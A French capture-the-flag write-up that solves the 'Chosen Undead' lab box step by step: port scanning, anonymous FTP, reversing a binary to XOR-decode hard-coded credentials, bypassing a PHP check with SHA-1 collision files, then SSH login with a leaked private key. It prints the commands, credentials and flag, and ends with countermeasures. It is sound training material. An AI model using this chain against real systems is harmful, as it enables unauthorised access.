---
author: Wallygator
date: 2026-10-06
version: 1.0.0
modification: Harmonisation du write-up
cve: CVE-2023-51767 pour OpenSSH <= 10.0, non exploité dans ce parcours ; CWE-327
---

# Write-up : Chosen Undead (user.txt)

## 1. Contexte et objectif

- **Cible** : `10.10.0.2` (IP dynamique, la box redémarre toutes les heures)
- **Difficulté annoncée** : la plus difficile du CTF (environ 5 résolutions sur 60)
- **Thème** : Dark Souls
- **Objectif** : récupérer le fichier `user.txt`.

## 2. Reconnaissance

On commence par scanner tous les ports :

```bash
nmap -p- -T4 10.10.0.2
```

Quatre ports sont ouverts :

| Port | Service |
| --- | --- |
| 22 | SSH (OpenSSH 10.0) |
| 11337 | HTTP (Apache 2.4.68, page par défaut) |
| 27777 | `tcpwrapped` (protocole inconnu) |
| 45454 | FTP (vsftpd 3.0.5) |

Un scan détaillé avec `nmap -sC -sV -p<port>` révèle que le FTP accepte les connexions anonymes grâce au script NSE `ftp-anon`.

Le scan exhaustif est important ici : c'est le port `45454`, absent des ports standards, qui ouvre toute la chaîne d'exploitation.

## 3. FTP anonyme : leurre et véritable indice

On se connecte au service FTP avec l'utilisateur `anonymous`. Un `ls` classique ne montre que `lore.txt`, un texte d'introduction lié à Dark Souls.

Il faut penser à afficher les fichiers cachés :

```text
ls -la
-rw-r--r-- 1 ftp ftp 16856 Aug 27 09:40 .undead
```

Le fichier `lore.txt` a été vérifié avec `xxd` et `cat -A` afin d'écarter une stéganographie textuelle. Il s'agit bien d'un leurre thématique.

Le fichier `.undead` est le véritable indice : c'est un binaire ELF.

## 4. Reverse engineering de `.undead`

### 4.1 Analyse initiale

```bash
file .undead
```

```text
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

Le binaire n'est pas *stripped* : les noms de fonctions et de variables sont conservés, ce qui facilite l'analyse.

On recherche ensuite les chaînes intéressantes :

```bash
strings -a .undead | grep -iE "key|user|pass|secret|xor"
```

On ne trouve que les noms `USERNAME`, `PASSWORD`, `KEY` et `secret`, pas les valeurs. Les identifiants sont donc probablement chiffrés en mémoire avec un XOR.

### 4.2 Désassemblage

```bash
objdump -d --disassemble=main .undead
objdump -d --disassemble=xor .undead
```

Il faut lire les deux fonctions dans cet ordre.

`main` décrit le fonctionnement du service :

1. `fopen` puis `fread` chargent `/home/pigmy/backdoor/secret.txt` ;
2. `socket`, `bind`, `listen` et `accept` créent le service TCP sur le port `27777` ;
3. `recv` reçoit le nom d'utilisateur et le mot de passe envoyés par le client ;
4. chaque valeur reçue est envoyée à `xor()` ;
5. le résultat est comparé aux buffers `USERNAME` et `PASSWORD` avec `strcmp` ;
6. si les deux comparaisons réussissent, le contenu de `secret.txt` est renvoyé.

La fonction `xor()` ne réalise pas un chiffrement complexe. Elle répète la clé et applique un XOR à chaque octet :

```text
entrée      : A B C D E F ...
clé répétée : D A R K S O ...
résultat    : A XOR D, B XOR A, C XOR R, ...
```

Le point important est le sens de la comparaison. Le programme chiffre l'entrée reçue avant de la comparer aux buffers stockés dans le binaire :

```text
entrée en clair --XOR avec KEY--> valeur comparée dans le binaire
```

Pour retrouver l'entrée en clair, on refait exactement la même opération :

```text
valeur comparée --XOR avec KEY--> entrée en clair
```

C'est possible parce que le XOR est réversible : `X XOR K XOR K = X`.

### 4.3 Extraction des identifiants

```bash
objdump -s -j .rodata .undead
objdump -s -j .data .undead
```

Cette commande affiche les octets bruts des sections où le programme stocke ses données. Le désassemblage permet de relier ces octets aux labels :

```text
0x40a0 <USERNAME>  -> octets du nom chiffré
0x40c0 <PASSWORD>  -> octets du mot de passe chiffré
0x40e0 <KEY>       -> DARKSOULS
```

On extrait ensuite les octets associés aux deux labels et on les décode avec la clé répétée. Le principe peut être reproduit avec ce script :

```python
key = b"DARKSOULS"
encrypted_username = bytes.fromhex("<octets lus à 0x40a0>")
encrypted_password = bytes.fromhex("<octets lus à 0x40c0>")

def xor_repeating(data, key):
  return bytes(value ^ key[index % len(key)] for index, value in enumerate(data))

print(xor_repeating(encrypted_username, key).rstrip(b"\\0").decode())
print(xor_repeating(encrypted_password, key).rstrip(b"\\0").decode())
```

`<octets lus à ...>` représente les valeurs hexadécimales copiées depuis la sortie de `objdump`. Il ne faut pas copier l'adresse mémoire ni les caractères ASCII affichés à droite : uniquement les octets hexadécimaux.

Le résultat du décodage est :

```text
Username : chosen_undead
Password : descendant_of_the_furtive_pigmy
```

Ces valeurs sont cohérentes avec le lore de Dark Souls et le chemin `/home/pigmy/backdoor/`.

### 4.4 Validation

```bash
nc <IP> 27777
```

```text
Username: chosen_undead
Password: descendant_of_the_furtive_pigmy
```

Le service renvoie alors :

```text
...you must visit Anor Londo, and acquire the Lordvessel. The path is anor_londo_city_of_gods.php
```

Cet indice mène au serveur web sur le port `11337`.
## 5. Web : `anor_londo_city_of_gods.php`

```bash
curl -i http://10.10.0.2:11337/anor_londo_city_of_gods.php
```

La page contient deux champs, `frampt` et `kaathe`, ainsi que l'indice suivant :

> Find them so the two sha be 1 — different yet very much alike

### 5.1 Fausse piste : les *magic hashes*

On pense d'abord à un jeu de mots autour de SHA-1 et à une exploitation du *type juggling* PHP. Lors d'une comparaison avec `==`, une chaîne comme `0e1234...` peut être interprétée comme zéro en notation scientifique.

Des paires connues publiquement sont testées, par exemple `10932435112` et `aaroZmOk`, mais elles échouent systématiquement, y compris après vérification locale avec PHP 8.3.

On génère alors deux paires inédites avec un programme C multithreadé :

```text
103438154664  -> 0e74706379472615610845903308772167694701
502679859138  -> 0e57093513759986643522735069519183116975
```

Le premier programme est ralenti par l'utilisation répétée de `sprintf` et `snprintf` dans la boucle chaude. Leur remplacement par des conversions manuelles permet de retrouver un débit correct. Malgré cela, les deux paires échouent sur le serveur.

### 5.2 Déduction de la logique serveur

Des tests différentiels permettent de comprendre le comportement :

```text
frampt=test&kaathe=test       -> "they are not the same snake"
frampt=0e123&kaathe=0e456    -> "they are not the same snake"
```

Le serveur compare d'abord les valeurs brutes avec `==`, afin de bloquer les valeurs identiques et le *type juggling*. Il compare ensuite les résultats de `sha1` avec `===`.

La comparaison stricte des hash explique l'échec des *magic hashes* : elles permettent une égalité numérique, pas une égalité stricte entre deux chaînes.

La logique déduite est donc :

```php
if ($frampt == $kaathe) {
    echo "not the same snake";
} elseif (sha1($frampt) === sha1($kaathe)) {
    echo secret;
} else {
    echo "sha be 1";
}
```

Il faut une véritable collision SHA-1 : deux contenus différents produisant exactement le même hash.

### 5.3 Collision SHA-1

Les fichiers PDF de l'attaque SHAttered sont d'abord testés. Le serveur les refuse avec le message :

> Come on, you know that's not the way, look harder

Le hash public de SHAttered est donc blacklisté.

Générer une nouvelle collision avec HashClash serait possible, mais nécessiterait plusieurs heures de calcul CPU. Une solution plus légère consiste à utiliser les fichiers `shat-a.bin` et `shat-b.bin`, publiés par William Entriken. Leur préfixe commun tronqué conserve la collision avec un hash différent de celui de SHAttered.

```bash
curl -sL -o shat-a.bin "https://phor.net/PUB/shat-a.bin"
curl -sL -o shat-b.bin "https://phor.net/PUB/shat-b.bin"
sha1sum shat-a.bin shat-b.bin
cmp shat-a.bin shat-b.bin
```

On envoie ensuite les deux fichiers au formulaire :

```bash
curl -v -X POST http://10.10.0.2:11337/anor_londo_city_of_gods.php \
  --data-urlencode "frampt@shat-a.bin" \
  --data-urlencode "kaathe@shat-b.bin"
```

La réponse est une redirection HTTP vers la page suivante :

```text
HTTP/1.1 302 Found
Location: the_age_of_dark_is_upon_us.php
```

La première tentative semblait avoir échoué car `curl -s`, sans `-L` ni affichage des en-têtes, masque cette redirection. Le code `302` confirme en réalité la réussite.

## 6. Page suivante : clé RSA

La page `the_age_of_dark_is_upon_us.php` nécessite de conserver le cookie `PHPSESSID` de la requête précédente :

```bash
curl -s -c cookies.txt -b cookies.txt \
  http://10.10.0.2:11337/the_age_of_dark_is_upon_us.php
```

Elle contient un lien vers une clé privée RSA :

```bash
curl -s -c cookies.txt -b cookies.txt \
  -o gwyn_rsa_kiln_secret_key \
  http://10.10.0.2:11337/gwyn_rsa_kiln_secret_key

file gwyn_rsa_kiln_secret_key
```

```text
PEM RSA private key
```

Aucune factorisation n'est nécessaire : la clé est directement utilisable.

## 7. Accès SSH et récupération du flag

Les permissions de la clé doivent être suffisamment restrictives :

```bash
chmod 600 gwyn_rsa_kiln_secret_key
ssh -i gwyn_rsa_kiln_secret_key gwyn@10.10.0.2
```

La connexion réussit avec l'utilisateur `gwyn`. Le hostname de la machine est `lordran`.

```bash
find / -name "user.txt" 2>/dev/null
cat /home/gwyn/user.txt
```

### Flag

```text
EPI{9Ro55Ly_1Nc4nDe5cENt}
```

## 8. Contre-mesures

### FTP anonyme et binaire de service exposé

- Désactiver l'accès FTP anonyme et ne pas déposer de binaire ou d'indice sensible dans un répertoire public.
- Maintenir les binaires à jour et restreindre leurs permissions.
- Ne pas coder d'identifiants dans le binaire ; utiliser un stockage de secrets et une authentification forte avec limitation de débit.

### Collision SHA-1 et comparaison d'entrées

- Ne pas utiliser SHA-1 pour une nouvelle fonctionnalité de sécurité ; préférer SHA-256 ou un mécanisme de signature adapté.
- Pour vérifier l'identité d'un fichier, utiliser une signature numérique ou un HMAC avec une clé secrète, pas seulement un hash fourni par le client.
- Comparer les entrées selon le besoin métier et ne jamais considérer deux valeurs comme sûres uniquement parce que leur hash correspond.

### Clé privée RSA téléchargée

- Ne jamais publier une clé privée sur le serveur web ; seule la clé publique doit être distribuée.
- Stocker les clés privées hors du webroot, avec des permissions restrictives, une passphrase et une rotation en cas d'exposition.
- Protéger les sessions par des cookies `Secure`, `HttpOnly` et `SameSite` lorsque l'application utilise un état serveur.